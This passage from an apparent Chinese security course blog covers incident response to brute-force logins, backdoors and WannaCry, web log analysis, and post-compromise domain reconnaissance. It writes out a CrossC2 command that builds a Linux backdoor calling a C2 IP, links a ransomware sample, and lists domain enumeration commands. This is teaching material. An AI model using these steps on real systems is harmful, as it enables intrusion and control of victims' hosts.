href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></li><li>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></li></ul><p>病毒查杀：</p><ul><li>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></li><li>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free">http://free.drweb.ru/download+cureit+free</a></li><li>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></li><li>360 杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></li></ul><p>病毒动态：</p><ul><li>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></li><li>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></li><li>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></li><li>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></li><li>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></li></ul><p>在线病毒扫描网站：</p><ul><li><a href="http://www.virscan.org/">http://www.virscan.org</a> &#x2F;&#x2F;多引擎在线病毒扫描网</li><li><a href="https://habo.qq.com/">https://habo.qq.com</a> &#x2F;&#x2F;腾讯哈勃分析系统</li><li><a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a> &#x2F;&#x2F;Jotti 恶意软件扫描系统</li><li><a href="http://www.scanvir.com/">http://www.scanvir.com</a> &#x2F;&#x2F;计算机病毒、手机病毒、可疑文件分析</li></ul><p>本课重点：</p><ul><li>案例1：攻击响应-暴力破解(RDP,SSH)-Win,Linux</li><li>案例2：控制响应-后门木马(Webshell,PC)-Win,Linux</li><li>案例3：危害响应-病毒感染(勒索 WannaCry)-Windows</li><li>案例4：自动化响应检测-Gscan 多重功能脚本测试-Linux</li></ul><p><strong>案例1：攻击响应-暴力破解(RDP,SSH)-Win,Linux</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Windows-LogFusion 载入查看：</span><br><span class="line">事件归类，事件 ID，事件状态等，参考百度资料</span><br><span class="line"> </span><br><span class="line">Linux-grep 筛选：</span><br><span class="line">1、统计了下日志，确认服务器遭受多少次暴力破解</span><br><span class="line">grep -o &quot;Failed password&quot; /var/log/secure|uniq -c</span><br><span class="line"> </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|head -1</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|tail -1</span><br><span class="line"> </span><br><span class="line">3、进一步定位有哪些 IP 在爆破？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c | sort -nr</span><br><span class="line"> </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">5、登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>案例演示1-windows日志查看</p><p>windows日志位置</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105605733-2003673825.png" alt="img"></p><p>windows自带日志工具不好用，查找分析不方便，推荐使用插件LogFusion</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105616713-1906900338.png" alt="img"></p><p>&lt;1&gt;LogFusion载入应用程序、硬件事件、安全、系统等日志</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105629592-1463328900.png" alt="img"></p><p>&lt;2&gt;使用弱口令工具进行暴力破解（选择RDP协议），模拟攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105640575-12476388.png" alt="img"></p><p>&lt;3&gt;在安全日志里看到很多账户登录失败的日志，可以判断当前主机遭受了爆破攻击，以及是否成功等</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105655910-394198380.png" alt="img"></p><p>&lt;4&gt;双击进入，查看详细信息（可以看到是哪个IP地址爆破密码成功，成功登录了本机）</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105710525-1863295461.png" alt="img"></p><p>案例演示2-linux日志查看</p><p>linux日志位置</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014110021037-229494275.png" alt="img"></p><p>&lt;1&gt;首先使用弱口令工具进行暴力破解（选择SSH协议），模拟攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014110033004-1519870807.png" alt="img"></p><p>&lt;2&gt;linux日志分析，使用grep筛选</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014110047517-1099965562.png" alt="img"></p><p><strong>案例2：控制响应-后门木马(Webshell,PC)-Win,Linux</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">windows：默认配置测试</span><br><span class="line">linux 借助 CrossC2 项目：netstat -ntulp</span><br><span class="line">https://github.com/gloxec/CrossC2</span><br><span class="line">https://github.com/darkr4y/geacon</span><br><span class="line">参考过程：http://www.adminxe.com/1287.html</span><br><span class="line"> </span><br><span class="line">CS借助CrossC2项目上线linux主机过程：</span><br><span class="line">1.项目上传至服务端目录，给予执行权限</span><br><span class="line"> </span><br><span class="line">2.配置监听器：</span><br><span class="line">windows/beacon_https/reverse_https 阿里云记得端口放行</span><br><span class="line"> </span><br><span class="line">3.生成后门：</span><br><span class="line">./genCrossC2.Linux 47.99.49.65 5566 null null Linux x64 C2</span><br><span class="line">通过网络监听工具及 windows 日志分析或执行记录查找后门问题</span><br></pre></td></tr></table></figure><p>案例演示1-windows分析</p><p>&lt;1&gt;windows执行木马，CS上线，模拟攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111028103-1785009800.png" alt="img"></p><p>&lt;2&gt;TCPView工具，可以查看哪个进程与远程IP通信过，从而确定系统是否曾经遭受过攻击。但是这个软件不太好用，上一步执行过的artifact.exe木马都没筛选出来。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111047835-1478710959.png" alt="img"></p><p>&lt;3&gt;Process Explorer工具，可以查看分析进程</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111106371-158030960.png" alt="img"></p><p>&lt;4&gt;PCHunter工具。缺点是，windows高版本网络信息，获取不全。比如木马在windows7执行后，该工具可以获取网络信息，如下图。但是同一木马在windows2018执行后，该工具获取不到网络信息。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111121533-527047994.png" alt="img"></p><p>&lt;5&gt;UserAssistView工具，可以看到所有在windows系统上执行过的文件</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111232696-2119872763.png" alt="img"></p><p>&lt;6&gt;logonsession工具，可以看到当前主机有哪些会话连接过，从而分析有没有过远程攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111148739-1776974961.png" alt="img"></p><p>&lt;7&gt;autoruns工具，可以查看windows系统的自启动项目，从而发现是否有木马病毒等</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111309657-1010183229.png" alt="img"></p><p>案例演示2-linux分析</p><p>CS是windows渗透工具，但是后期经过一些插件的开发，CS也可以上线linux系统，比如CS借助CrossC2项目上线linux主机</p><p>&lt;1&gt;项目上传至服务端目录，给予执行权限</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111358915-2080203179.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111412966-1677179494.png" alt="img"></p><p>&lt;2&gt;配置监听器：windows&#x2F;beacon_https&#x2F;reverse_https 阿里云记得端口放行</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111438147-123524252.png" alt="img"></p><p>&lt;3&gt;生成后门：.&#x2F;genCrossC2.Linux 47.99.49.65 5566 null null Linux x64 C2</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111449756-1364526674.png" alt="img"></p><p>&lt;4&gt;将后门上传到linux主机并执行</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111501864-1256480631.png" alt="img"></p><p>&lt;5&gt;CS成功上线</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111511740-301603503.png" alt="img"></p><p>&lt;6&gt;接下来就是分析日志，查找后门等，具体可见案例4。</p><p><strong>案例3：危害响应-病毒感染(勒索 WannaCry)-Windows</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">详细说明中毒表现及恢复指南</span><br><span class="line">推荐2个勒索病毒解密网站</span><br><span class="line">https://lesuobingdu.360.cn/</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">[下载]永恒之蓝样本（勒索病毒）： https://bbs.pediy.com/thread-217586-1.htm</span><br></pre></td></tr></table></figure><p>案例演示</p><p>&lt;1&gt;下载勒索病毒样本，在虚拟机上执行（不要在本机执行，谨慎执行）</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112304574-1581830618.png" alt="img"></p><p>&lt;2&gt;中毒后显示如下</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112318774-2000031928.png" alt="img"></p><p>&lt;3&gt;打开任何文件都乱码，弹框</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112333037-764517958.png" alt="img"></p><p>&lt;4&gt;可以使用360勒索病毒解密网站进行病毒查询、在线解密等。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112348528-1745499734.png" alt="img"></p><p>&lt;5&gt;也可以使用nomoreransom网站尝试解密。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112415274-195024924.png" alt="img"></p><p><strong>案例4：自动化响应检测-Gscan 多重功能脚本测试-Linux</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考：https://github.com/grayddq/GScan/</span><br><span class="line">自动化响应检测工具：GScan、chkrootkit、rkhunter、lynis</span><br><span class="line">都下载一下，应急响应时全都跑一遍</span><br></pre></td></tr></table></figure><p>案例演示</p><p>&lt;1&gt;执行Gscan脚本</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014113818928-645892866.png" alt="img"> </p><p>&lt;2&gt;可以看到，黑客进行了哪些攻击行为，是否成功等。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014113659804-2002972003.png" alt="img"></p><p>&lt;3&gt;netstat -ntl可以查看tcp端口等，再通过ps命令找到对应的进程，分析其是否是木马病毒</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014113725256-180849926.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;74-应急响应-win&amp;amp;linux分析后门&amp;amp;勒索病毒&amp;amp;攻击&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>73-应急响应-WEB分析php&amp;javaweb&amp;自动化工具</title>
    <link href="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/73%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-WEB%E5%88%86%E6%9E%90php&amp;javaweb&amp;%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/73%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-WEB%E5%88%86%E6%9E%90php&amp;javaweb&amp;%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/</id>
    <published>2023-05-26T03:15:21.606Z</published>
    <updated>2023-06-06T15:36:44.293Z</updated>
    
    <content type="html"><![CDATA[<p>73-应急响应-WEB分析php&amp;javaweb&amp;自动化工具</p><span id="more"></span><p>应急响应：</p><ul><li>保护阶段，分析阶段，复现阶段，修复阶段，建议阶段</li><li>目的：分析出攻击时间，攻击操作，攻击后果，安全修复等并给出合理解决方案。</li></ul><p>必备知识点：</p><ul><li>1.熟悉常见的 WEB 安全攻击技术</li><li>2.熟悉相关日志启用及存储查看等</li><li>3.熟悉日志中记录数据分类及分析等</li></ul><p>准备工作：</p><ul><li>1.收集目标服务器各类信息</li><li>2.部署相关分析软件及平台等</li><li>3.整理相关安全渗透工具指纹库</li><li>4.针对异常表现第一时间触发思路</li></ul><p>从表现预估入侵面及权限面进行排查</p><ul><li>有明确信息网站被入侵：<ul><li>基于时间 基于操作 基于指纹 基于其他</li></ul></li><li>无明确信息网站被入侵：<ul><li>1.WEB 漏洞-检查源码类别及漏洞情况</li><li>2.中间件漏洞-检查对应版本及漏洞情况</li><li>3.第三方应用漏洞-检查是否存在漏洞应用</li><li>4.操作系统层面漏洞-检查是否存在系统漏洞</li><li>5.其他安全问题(口令,后门等)-检查相关应用口令及后门扫描</li></ul></li></ul><p>常见分析方法：</p><ul><li>指纹库搜索，日志时间分析，后门追查分析，漏洞检查分析等</li></ul><p>本课重点：</p><ul><li>案例1：Windows+IIS+Sql-日志,搜索</li><li>案例2：Linux+BT_Nginx+tp5-日志,后门</li><li>案例3：Linux+Javaweb+st2-日志,后门,时间</li><li>案例4：360 星图日志自动分析工具-演示,展望</li></ul><p><strong>案例1：Windows+IIS+Sql-日志,搜索</strong></p><p>故事回顾：某小企业反映自己的网站出现异常，请求支援</p><p>思路：进入网站服务器，通过配置文件找到网站日志目录，打开日志，搜索分析</p><p>&lt;1&gt;可以进行指纹库搜索，比如sqlmap</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012110435200-694030759.png" alt="img"></p><p>&lt;2&gt;也可以进行关键字搜索，比如select</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012110502459-1741890607.png" alt="img"></p><p><strong>案例2：Linux+BT_Nginx+tp5-日志,后门</strong></p><p>故事回顾：某黑X哥哥反映自己的网站出现异常，请求支援</p><p>&lt;1&gt;分析日志</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012110613510-114283520.png" alt="img"></p><p>&lt;2&gt;查杀后门</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012110628476-1446969040.png" alt="img"></p><p>&lt;3&gt;使用工具-10款常见的Webshell检测工具：<a href="https://www.cnblogs.com/xiaozi/p/12679777.html">https://www.cnblogs.com/xiaozi/p/12679777.html</a> </p><p><strong>案例3：Linux+Javaweb+st2-日志,后门,时间</strong></p><p>故事回顾：群友接到客户的反馈要求简要分析攻击方式，找出漏洞，修复并溯源</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012110645219-822817005.png" alt="img"></p><p>根据webshell关键字找到是谁，在何时上传了后门，何时利用</p><p>若日志太多，推荐一款工具-FileSeek文件搜索工具</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012111056847-595719577.png" alt="img"></p><p><strong>案例4：360 星图日志自动分析工具-演示,展望</strong></p><p>缺陷：其他日志该怎么分析？ELK,Splunk配合使用–ELK,Splunk是蓝队必备工具</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211012111200684-1998271612.png" alt="img"></p><p>涉及资源：</p><p><a href="https://www.cnblogs.com/xiaozi/p/13198071.html">https://www.cnblogs.com/xiaozi/p/13198071.html</a> 10款日志分析工具<br><a href="https://www.cnblogs.com/xiaozi/p/12679777.html">https://www.cnblogs.com/xiaozi/p/12679777.html</a> 10款常见的Webshell检测工具<br><a href="https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg">https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg</a> 提取码:: xiao 应急响应资料工具-小迪安全</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;73-应急响应-WEB分析php&amp;amp;javaweb&amp;amp;自动化工具&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>65-内网安全-域环境&amp;工作组&amp;局域网探针方案</title>
    <link href="http://blog.hvvl404.fun/2023/05/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E6%A1%88/"/>
    <id>http://blog.hvvl404.fun/2023/05/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E6%A1%88/</id>
    <published>2023-05-24T14:20:01.894Z</published>
    <updated>2023-06-06T15:37:24.330Z</updated>
    
    <content type="html"><![CDATA[<p>65-内网安全-域环境&amp;工作组&amp;局域网探针方案</p><span id="more"></span><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-1.png" alt="65-1"></p><p><strong>一 基本认知</strong></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-2.png" alt="65-1"></p><p><strong>DMZ</strong>：</p><ul><li>英文全名“Demilitarized Zone”，中文含义是“隔离区”，在安全领域的具体含义是“内外网防火墙之间的区域”。DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。</li></ul><p><strong>工作组 VS 域环境</strong></p><ul><li>工作组：地位平等，管理分散，没有集中管理。</li><li>域环境：地位不平等，管理集中，实现集中管理。</li><li>域环境也可以简单的理解为工作组的升级版，更好管理。</li><li>这里我们把域环境和工作组区分开来是因为他们的攻击手段不同，工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</li></ul><p><strong>域控制器DC</strong>：</p><ul><li>域控DC是这个域中的管理者，域里面的最高权限，判断是否拿下整个域，就是看你是否拿下这台域控制器。</li></ul><p><strong>AD（活动目录）</strong>：</p><ul><li>是微软所提供的目录服务（查询，身份验证），活动目录的核心包含了活动目录数据库，在活动目录数据库中包含了域中所有的对象（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server  以及Windows Datacenter Server的目录服务。Active  Directory储存了有关网络对象的信息，并且让管理员和用户能够轻松的查找和使用这些信息，Active  Directory使用了一种结构化的数据储存方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</li></ul><p><strong>linux域渗透问题：</strong></p><ul><li>Q：AD域控制器只在windows server系统能做吗？Linux可以？</li><li>A：linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，个人认为Linux还是比较适合做服务器好一点。（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）</li></ul><p><strong>局域网技术适用问题：</strong></p><ul><li>不同的攻击技术手段适用面不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。</li></ul><p><strong>大概内网安全流程问题：</strong></p><ul><li>熟悉基础概念-信息收集-后续探针-权限提升-横向渗透-权限维持</li></ul><p><strong>二 案例演示</strong></p><p>本课重点</p><ul><li>案例1：基本信息收集操作演示</li><li>案例2：网络信息收集操作演示</li><li>案例3：用户信息收集操作演示</li><li>案例4：凭据信息收集操作演示</li><li>案例5：探针主机域控架构服务操作演示</li></ul><p><strong>环境介绍</strong></p><p>下图属于单域环境，Windows2008R2作为域控DC，有五个域成员主机，fileserver文件服务器、SqlServer数据库服务器、webserver网站服务器和两台个人PC。他们都是在192.168.3.0这个网段，网站服务器有两个网卡，一个在3.31一个在230.131，这个230.133就好比是它的一个对外出口（外网接口），kali攻击机就好比攻击者，它通过230.131这个接口进入网站服务器计算机，由于这台计算机是处于内网连接，所有它享有3这个网段的访问权限。拿下网站服务器后的首要攻击目标就是DC！只要拿下DC，也就相当于同时拿下了所有域成员主机权限。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-3.png" alt="65-1"></p><p><strong>案例1：基本信息收集操作演示</strong></p><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备。</p><p>服务器角色就是这台服务器是干嘛的，它在内网中扮演什么角色，比如mary-pc就是个人办公电脑，SqlServer就是数据库服务器，每台服务器都是有一个角色的，是仅仅个人用，还是用来文件传输？用来dns解析？</p><p>假设已经拿下了一台内网服务器webserver：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息（操作系统版本、补丁编号等信息）</span><br><span class="line">net start 启动服务（查看当前主机开启了哪些服务，从服务中就可以判断它是什么角色）</span><br><span class="line">tasklist 进程列表（查看当前主机开启了哪些进程）</span><br><span class="line">schtasks 计划任务（若报错无法加载列资源，说明你的权限不够，因此要提权才能使用该命令）</span><br></pre></td></tr></table></figure><p><strong>案例2：网络信息收集操作演示</strong></p><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 判断存在域-最简单方式查看主DNS后缀</span><br><span class="line">net view /domain 判断存在域</span><br><span class="line">net time /domain 判断主域（主域就是域控的意思）【在域环境下查看当前时间】</span><br><span class="line">nslookup &lt;域控制器全名&gt; 追踪来源地址</span><br><span class="line">netstat -ano 当前网络端口开放</span><br></pre></td></tr></table></figure><p>&lt;1&gt;ipconfig &#x2F;all 查看主DNS后缀，这就是当前最简单最直接判断当前服务器是域环境还是单纯的工作组局域网环境！有域的话会有主DNS，因为在域环境里面通常会由DNS解析服务器。这是第一个判断标准。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-4.png" alt="65-1"></p><p>&lt;2&gt;net view &#x2F;domain 判断存在域</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-5.png" alt="65-1"></p><p>&lt;3&gt;net time &#x2F;domain 判断主域（主域就是域控的意思）【在域环境下查看当前时间】</p><p>net time &#x2F;domain 可以判断主域，是因为域成员计算机的时间一般会以域控制器为准，所以当执行net time  &#x2F;domain命令时，该计算机会去域控获取时间，此时返回的OWA2010CN-God.god.org就是域控的计算机全名。然后可以通过nslookup来最终确认域控IP。</p><p>每一台计算机名字都是基于域名下面生成的（如SqlServer.god.org），另外，如果找到了god.org、sqlserver.god.org、xiaodi.sqlserver.god.org之类的计算机全名，说明当前环境存在多域，sqlserver.god.org是父域，xiaodi.sqlserver.god.org是子域。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-6.png" alt="65-1"></p><p>&lt;4&gt;nslookup &lt;域控制器全名&gt; 追踪来源地址</p><p>OWA2010CN-God.god.org就是域控的计算机全名，我们可以通过nslookup和ping命令去ping这个名字来获取域控的对应ip地址。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-7.png" alt="65-1"></p><p>&lt;5&gt;netstat -ano 查看当前网络端口开放</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-8.png" alt="65-1"></p><p><strong>案例3：用户信息收集操作演示</strong></p><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><p>系统默认常见用户身份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Domain Admains：域管理员（默认对域控制器有完全控制权）</span><br><span class="line">Domain Computers：域内机器</span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line">Domain users：域用户</span><br><span class="line">Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权）</span><br><span class="line"> </span><br><span class="line">我们主要攻击Domain Admains和Enterprise Admains</span><br><span class="line">大部分成员主机在Domain users域用户里</span><br></pre></td></tr></table></figure><p>相关用户收集操作命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 当前电脑里面的用户（本地用户）</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 当前域里面的用户</span><br><span class="line">net group /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span 